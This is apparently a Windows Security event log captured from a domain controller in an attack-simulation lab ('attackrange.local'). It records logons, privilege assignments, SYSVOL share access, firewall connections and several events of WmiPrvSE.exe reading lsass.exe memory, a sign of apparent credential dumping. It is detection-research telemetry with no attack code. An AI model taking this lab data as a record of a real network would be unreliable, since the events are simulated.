TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382605
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Mutant
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorMutex
	Object Handle:	0x18c

Process Information:
	Process ID:	0x1a6c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				Query mutant state
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382604
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x2f0
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382626
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1e9c
	Process Name:	C:\Windows\System32\conhost.exe
	Exit Status:	0x0
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382625
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x22ec
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382624
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x20b8
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382623
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Section
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorPreference
	Object Handle:	0x194

Process Information:
	Process ID:	0x1e9c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query section state
				Map section for write
				Map section for read
				Map section for execute
				Extend size
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382622
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x190

Process Information:
	Process ID:	0x1e9c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	2031617
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382621
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Mutant
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorMutex
	Object Handle:	0x190

Process Information:
	Process ID:	0x1e9c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				Query mutant state
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382620
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x2f4
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382628
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55166
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382627
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55166
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382656
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61671
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382655
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		57818
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382654
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		57818
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382653
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57818
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382652
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57818
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382651
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C742

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382650
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C830

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382649
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C878

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382648
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C8EE

Network Information:	
	Object Type:		File
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55169
	
Share Information:
	Share Name:		\\*\SYSVOL
	Share Path:		\??\C:\Windows\SYSVOL\sysvol
	Relative Target Name:	attackrange.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\gpt.ini

Access Request Information:
	Access Mask:		0x120089
	Accesses:		READ_CONTROL
				SYNCHRONIZE
				ReadData (or ListDirectory)
				ReadEA
				ReadAttributes
				
Access Check Results:
	READ_CONTROL:	Granted by Ownership
				SYNCHRONIZE:	Granted by	D:(A;;0x1200a9;;;WD)
				ReadData (or ListDirectory):	Granted by	D:(A;;0x1200a9;;;WD)
				ReadEA:	Granted by	D:(A;;0x1200a9;;;WD)
				ReadAttributes:	Granted by	D:(A;;0x1200a9;;;WD)
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382647
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C8EE

Network Information:	
	Object Type:		File
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55169
	
Share Information:
	Share Name:		\\*\SYSVOL
	Share Path:		\??\C:\Windows\SYSVOL\sysvol
	Relative Target Name:	attackrange.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\gpt.ini

Access Request Information:
	Access Mask:		0x120089
	Accesses:		READ_CONTROL
				SYNCHRONIZE
				ReadData (or ListDirectory)
				ReadEA
				ReadAttributes
				
Access Check Results:
	READ_CONTROL:	Granted by Ownership
				SYNCHRONIZE:	Granted by	D:(A;;0x1200a9;;;WD)
				ReadData (or ListDirectory):	Granted by	D:(A;;0x1200a9;;;WD)
				ReadEA:	Granted by	D:(A;;0x1200a9;;;WD)
				ReadAttributes:	Granted by	D:(A;;0x1200a9;;;WD)
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5140
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=File Share
OpCode=Info
RecordNumber=1382646
Keywords=Audit Success
Message=A network share object was accessed.
	
Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C8EE

Network Information:	
	Object Type:		File
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55169
	
Share Information:
	Share Name:		\\*\SYSVOL
	Share Path:		\??\C:\Windows\SYSVOL\sysvol

Access Request Information:
	Access Mask:		0x1
	Accesses:		ReadData (or ListDirectory)
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382645
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x501C8EE
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	fe80::6167:9038:1edc:47d4
	Source Port:		55169

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382644
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C8EE

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382643
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55169
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		445
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382642
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55169
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		445
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382641
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Source Address:		::
	Source Port:		55169
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382640
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x501C878
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	10.0.1.14
	Source Port:		55168

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382639
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C878

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382638
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		10.0.1.14
	Source Port:		55168
	Destination Address:	10.0.1.14
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382637
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1540
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55168
	Destination Address:	10.0.1.14
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382636
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1540
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55168
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382635
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x501C830
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382634
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C830

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382633
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x501C742
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	fe80::6167:9038:1edc:47d4
	Source Port:		55167

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382632
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x501C742

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
